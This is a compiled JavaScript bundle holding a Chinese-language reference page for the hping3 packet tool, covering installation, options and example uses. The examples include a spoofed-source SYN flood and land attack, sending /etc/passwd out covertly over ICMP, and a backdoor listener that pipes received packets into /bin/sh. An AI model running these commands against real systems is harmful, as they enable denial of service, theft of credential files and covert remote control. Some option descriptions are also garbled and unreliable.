(window.webpackJsonp=window.webpackJsonp||[]).push([[281],{594:function(a,s,e){"use strict";e.r(s);var t=e(14),r=Object(t.a)({},(function(){var a=this,s=a._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[s("h1",{attrs:{id:"hping3"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#hping3"}},[a._v("#")]),a._v(" hping3")]),a._v(" "),s("p",[a._v("测试网络及主机的安全")]),a._v(" "),s("h2",{attrs:{id:"补充说明"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#补充说明"}},[a._v("#")]),a._v(" 补充说明")]),a._v(" "),s("p",[s("strong",[a._v("hping")]),a._v(" 是用于生成和解析TCPIP协议数据包的开源工具。创作者是Salvatore Sanfilippo。目前最新版是hping3，支持使用tcl脚本自动化地调用其API。hping是安全审计、防火墙测试等工作的标配工具。hping优势在于能够定制数据包的各个部分，因此用户可以灵活对目标机进行细致地探测。")]),a._v(" "),s("h3",{attrs:{id:"安装"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#安装"}},[a._v("#")]),a._v(" 安装")]),a._v(" "),s("div",{staticClass:"language-shell extra-class"},[s("pre",{pre:!0,attrs:{class:"language-shell"}},[s("code",[a._v("yum "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("install")]),a._v(" libpcap-devel tc-devel\n"),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("ln")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-s")]),a._v(" /usr/include/pcap-bpf.h /usr/include/net/bpf.h\n"),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("wget")]),a._v(" http://www.hping.org/hping3-20051105.tar.gz\n"),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("tar")]),a._v(" zxvf hping3-20051105.tar.gz\n"),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[a._v("cd")]),a._v(" hping3-20051105\n./configure\n"),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("make")]),a._v("\n"),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("make")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("install")]),a._v("\n")])])]),s("h3",{attrs:{id:"选项"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#选项"}},[a._v("#")]),a._v(" 选项")]),a._v(" "),s("div",{staticClass:"language-shell extra-class"},[s("pre",{pre:!0,attrs:{class:"language-shell"}},[s("code",[s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-H")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--help")]),a._v(" 显示帮助。\n"),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-v")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-VERSION")]),a._v(" 版本信息。\n"),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-c")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--count")]),a._v(" count 发送数据包的次数 关于countreached_timeout 可以在hping2.h里编辑。\n"),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-i")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--interval")]),a._v(" 包发送间隔时间（单位是毫秒）缺省时间是1秒,此功能在增加传输率上很重要,在idle/spoofing扫描时此功能也会被用到,你可以参考hping-howto获得更多信息-fast 每秒发10个数据包。\n"),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-n")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-nmeric")]),a._v(" 数字输出，象征性输出主机地址。\n"),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-q")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-quiet")]),a._v(" 退出。\n"),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-I")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--interface")]),a._v(" interface name 无非就是eth0之类的参数。\n"),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-v")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--verbose")]),a._v(" 显示很多信息，TCP回应一般如：len"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("46")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a._v("ip")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("192.168")]),a._v(".1.1 "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a._v("flags")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v("RADF "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a._v("seq")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("0")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a._v("ttl")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("255")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a._v("id")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("0")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a._v("win")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("0")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a._v("rtt")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("0")]),a._v(".4ms "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a._v("tos")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("0")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a._v("iplen")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("40")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a._v("seq")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("0")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a._v("ack")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("1380893504")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a._v("sum")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("2010")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a._v("urp")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("0")]),a._v("\n"),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-D")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--debug")]),a._v(" 进入debug模式当你遇到麻烦时，比如用HPING遇到一些不合你习惯的时候，你可以用此模式修改HPING，（INTERFACE DETECTION,DATA LINK LAYER ACCESS,INTERFACE SETTINGS,"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("..")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("..")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("..")]),a._v(".）\n"),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-z")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--bind")]),a._v(" 快捷键的使用。\n"),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-Z")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--unbind")]),a._v(" 消除快捷键。\n"),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-O")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--rawip")]),a._v(" RAWIP模式，在此模式下HPING会发送带数据的IP头。\n"),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-1")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--icmp")]),a._v(" ICMP模式，此模式下HPING会发送IGMP应答报，你可以用--ICMPTYPE --ICMPCODE选项发送其他类型/模式的ICMP报文。\n"),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-2")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--udp")]),a._v(" UDP 模式，缺省下，HPING会发送UDP报文到主机的0端口，你可以用--baseport "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--destport")]),a._v(" --keep选项指定其模式。\n"),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-9")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--listen")]),a._v(" signatuer hping的listen模式，用此模式，HPING会接收指定的数据。\n"),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-a")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--spoof")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("hostname")]),a._v(" 伪造IP攻击，防火墙就不会记录你的真实IP了，当然回应的包你也接收不到了。\n"),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-t")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--ttl")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("time")]),a._v(" to live 可以指定发出包的TTL值。\n"),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-H")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--ipproto")]),a._v(" 在RAW IP模式里选择IP协议。\n"),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-w")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--WINID")]),a._v(" UNIX ,WINDIWS的id回应不同的，这选项可以让你的ID回应和WINDOWS一样。\n"),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-r")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--rel")]),a._v(" 更改ID的，可以让ID曾递减输出，详见HPING-HOWTO。\n"),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-F")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--FRAG")]),a._v(" 更改包的FRAG，这可以测试对方对于包碎片的处理能力，缺省的“virtual mtu”是16字节。\n"),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-x")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--morefrag")]),a._v(" 此功能可以发送碎片使主机忙于恢复碎片而造成主机的拒绝服务。\n"),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-y")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-dontfrag")]),a._v(" 发送不可恢复的IP碎片，这可以让你了解更多的MTU "),s("span",{pre:!0,attrs:{class:"token environment constant"}},[a._v("PATH")]),a._v(" DISCOVERY。\n"),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-G")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--fragoff")]),a._v(" fragment offset value "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[a._v("set")]),a._v(" the fragment offset\n"),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-m")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--mtu")]),a._v(" mtu value 用此项后ID数值变得很大，50000没指定此项时3000-20000左右。\n"),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-G")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--rroute")]),a._v(" 记录路由，可以看到详悉的数据等等，最多可以经过9个路由，即使主机屏蔽了ICMP报文。\n"),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-C")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--ICMPTYPE")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[a._v("type")]),a._v(" 指定ICMP类型，缺省是ICMP "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[a._v("echo")]),a._v(" REQUEST。\n"),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-K")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--ICMPCODE")]),a._v(" CODE 指定ICMP代号，缺省0。\n--icmp-ipver 把IP版本也插入IP头。\n--icmp-iphlen 设置IP头的长度，缺省为5（32字节）。\n--icmp-iplen 设置IP包长度。\n--icmp-ipid 设置ICMP报文IP头的ID，缺省是"),s("span",{pre:!0,attrs:{class:"token environment constant"}},[a._v("RANDOM")]),a._v("。\n--icmp-ipproto 设置协议的，缺省是TCP。\n-icmp-cksum 设置校验和。\n-icmp-ts "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[a._v("alias")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token keyword"}},[a._v("for")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--icmptype")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("13")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),a._v("to send ICMP timestamp requests"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v("\n--icmp-addr Alias "),s("span",{pre:!0,attrs:{class:"token keyword"}},[a._v("for")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--icmptype")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("17")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),a._v("to send ICMP address mask requests"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v("\n"),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-s")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--baseport")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[a._v("source")]),a._v(" port hping 用源端口猜测回应的包，它从一个基本端口计数，每收一个包，端口也加1，这规则你可以自己定义。\n"),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-p")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--deskport")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("[")]),a._v("+"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("]")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("[")]),a._v("+"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("]")]),a._v("desk port 设置目标端口，缺省为0，一个加号设置为:每发送一个请求包到达后，端口加1，两个加号为：每发一个包，端口数加1。\n"),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--keep")]),a._v(" 上面说过了。\n"),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-w")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--win")]),a._v(" 发的大小和windows一样大，64BYTE。\n"),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-O")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--tcpoff")]),a._v(" Set fake tcp data offset. Normal data offset is tcphdrlen / "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("4")]),a._v(".\n"),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-m")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--tcpseq")]),a._v(" 设置TCP序列数。\n"),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-l")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--tcpck")]),a._v(" 设置TCP ack。\n"),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-Q")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--seqnum")]),a._v(" 搜集序列号的，这对于你分析TCP序列号有很大作用。\n")])])]),s("h3",{attrs:{id:"hping3功能"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#hping3功能"}},[a._v("#")]),a._v(" Hping3功能")]),a._v(" "),s("p",[a._v("Hping3主要有以下典型功能应用：")]),a._v(" "),s("h3",{attrs:{id:"防火墙测试"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#防火墙测试"}},[a._v("#")]),a._v(" #  防火墙测试")]),a._v(" "),s("p",[a._v("使用Hping3指定各种数据包字段，依次对防火墙进行详细测试。请参考：http://0daysecurity.com/articles/hping3_examples.html")]),a._v(" "),s("p",[a._v("测试防火墙对ICMP包的反应、是否支持traceroute、是否开放某个端口、对防火墙进行拒绝服务攻击（DoS attack）。例如，以LandAttack方式测试目标防火墙（Land Attack是将发送源地址设置为与目标地址相同，诱使目标机与自己不停地建立连接）。")]),a._v(" "),s("div",{staticClass:"language-shell extra-class"},[s("pre",{pre:!0,attrs:{class:"language-shell"}},[s("code",[a._v("hping3 "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-S")]),a._v("  "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-c")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("1000000")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-a")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("10.10")]),a._v(".10.10 "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-p")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("21")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("10.10")]),a._v(".10.10\n")])])]),s("h3",{attrs:{id:"端口扫描"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#端口扫描"}},[a._v("#")]),a._v(" # 端口扫描")]),a._v(" "),s("p",[a._v("Hping3也可以对目标端口进行扫描。Hping3支持指定TCP各个标志位、长度等信息。以下示例可用于探测目标机的80端口是否开放：")]),a._v(" "),s("div",{staticClass:"language-shell extra-class"},[s("pre",{pre:!0,attrs:{class:"language-shell"}},[s("code",[a._v("hping3 "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-I")]),a._v(" eth0  "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-S")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("192.168")]),a._v(".10.1 "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-p")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("80")]),a._v("\n")])])]),s("p",[a._v("其中"),s("code",[a._v("-I eth0")]),a._v("指定使用eth0端口，"),s("code",[a._v("-S")]),a._v("指定TCP包的标志位SYN，"),s("code",[a._v("-p 80")]),a._v("指定探测的目的端口。")]),a._v(" "),s("p",[a._v("hping3支持非常丰富的端口探测方式，nmap拥有的扫描方式hping3几乎都支持（除开connect方式，因为Hping3仅发送与接收包，不会维护连接，所以不支持connect方式探测）。而且Hping3能够对发送的探测进行更加精细的控制，方便用户微调探测结果。当然，Hping3的端口扫描性能及综合处理能力，无法与Nmap相比。一般使用它仅对少量主机的少量端口进行扫描。")]),a._v(" "),s("h3",{attrs:{id:"idle扫描"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#idle扫描"}},[a._v("#")]),a._v(" # Idle扫描")]),a._v(" "),s("p",[a._v("Idle扫描（Idle Scanning）是一种匿名扫描远程主机的方式，该方式也是有Hping3的作者Salvatore Sanfilippo发明的，目前Idle扫描在Nmap中也有实现。")]),a._v(" "),s("p",[a._v("该扫描原理是：寻找一台idle主机（该主机没有任何的网络流量，并且IPID是逐个增长的），攻击端主机先向idle主机发送探测包，从回复包中获取其IPID。冒充idle主机的IP地址向远程主机的端口发送SYN包（此处假设为SYN包），此时如果远程主机的目的端口开放，那么会回复SYN/ACK，此时idle主机收到SYN/ACK后回复RST包。然后攻击端主机再向idle主机发送探测包，获取其IPID。那么对比两次的IPID值，我们就可以判断远程主机是否回复了数据包，从而间接地推测其端口状态。")]),a._v(" "),s("h3",{attrs:{id:"拒绝服务攻击"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#拒绝服务攻击"}},[a._v("#")]),a._v(" # 拒绝服务攻击")]),a._v(" "),s("p",[a._v("使用Hping3可以很方便构建拒绝服务攻击。比如对目标机发起大量SYN连接，伪造源地址为192.168.10.99，并使用1000微秒的间隔发送各个SYN包。")]),a._v(" "),s("div",{staticClass:"language-shell extra-class"},[s("pre",{pre:!0,attrs:{class:"language-shell"}},[s("code",[a._v("hping3 "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-I")]),a._v(" eth0 "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-a192.168.10.99")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-S")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("192.168")]),a._v(".10.33 "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-p")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("80")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-i")]),a._v(" u1000\n")])])]),s("p",[a._v("其他攻击如smurf、teardrop、land attack等也很容易构建出来。")]),a._v(" "),s("h3",{attrs:{id:"文件传输"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#文件传输"}},[a._v("#")]),a._v(" # 文件传输")]),a._v(" "),s("p",[a._v("Hping3支持通过TCP/UDP/ICMP等包来进行文件传输。相当于借助TCP/UDP/ICMP包建立隐秘隧道通讯。实现方式是开启监听端口，对检测到的签名（签名为用户指定的字符串）的内容进行相应的解析。在接收端开启服务：")]),a._v(" "),s("div",{staticClass:"language-shell extra-class"},[s("pre",{pre:!0,attrs:{class:"language-shell"}},[s("code",[a._v("hping3 "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("192.168")]),a._v(".1.159--listen signature "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--safe")]),a._v("  "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--icmp")]),a._v("\n")])])]),s("p",[a._v("监听ICMP包中的签名，根据签名解析出文件内容。")]),a._v(" "),s("p",[a._v("在发送端使用签名打包的ICMP包发送文件：")]),a._v(" "),s("div",{staticClass:"language-shell extra-class"},[s("pre",{pre:!0,attrs:{class:"language-shell"}},[s("code",[a._v("hping3 "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("192.168")]),a._v(".1.108--icmp ?d "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("100")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--sign")]),a._v(" signature "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--file")]),a._v(" /etc/passwd\n")])])]),s("p",[a._v("将"),s("code",[a._v("/etc/passwd")]),a._v("密码文件通过ICMP包传给192.168.10.44主机。发送包大小为100字节（-d 100），发送签名为signature(-sign signature)。")]),a._v(" "),s("h3",{attrs:{id:"木马功能"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#木马功能"}},[a._v("#")]),a._v(" # 木马功能")]),a._v(" "),s("p",[a._v("如果Hping3能够在远程主机上启动，那么可以作为木马程序启动监听端口，并在建立连接后打开shell通信。与netcat的后门功能类似。")]),a._v(" "),s("p",[a._v("示例：本地打开53号UDP端口（DNS解析服务）监听来自192.168.10.66主机的包含签名为signature的数据包，并将收到的数据调用/bin/sh执行。")]),a._v(" "),s("p",[a._v("在木马启动端：")]),a._v(" "),s("div",{staticClass:"language-shell extra-class"},[s("pre",{pre:!0,attrs:{class:"language-shell"}},[s("code",[a._v("hping3 "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("192.168")]),a._v(".10.66--listen signature "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--safe")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--udp")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-p")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("53")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("|")]),a._v(" /bin/sh\n")])])]),s("p",[a._v("在远程控制端：")]),a._v(" "),s("div",{staticClass:"language-shell extra-class"},[s("pre",{pre:!0,attrs:{class:"language-shell"}},[s("code",[s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[a._v("echo")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("ls")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">")]),a._v("test.cmd\nhping3 "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("192.168")]),a._v(".10.44 "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-p53")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-d")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("100")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--udp")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--sign")]),a._v(" siganature "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--file")]),a._v(" ./test.cmd\n")])])]),s("p",[a._v("将包含ls命令的文件加上签名signature发送到192.168.10.44主机的53号UDP端口，包数据长度为100字节。")]),a._v(" "),s("p",[a._v("当然这里只是简单的演示程序，真实的场景，控制端可以利益shell执行很多的高级复杂的操作。")])])}),[],!1,null,null,null);s.default=r.exports}}]);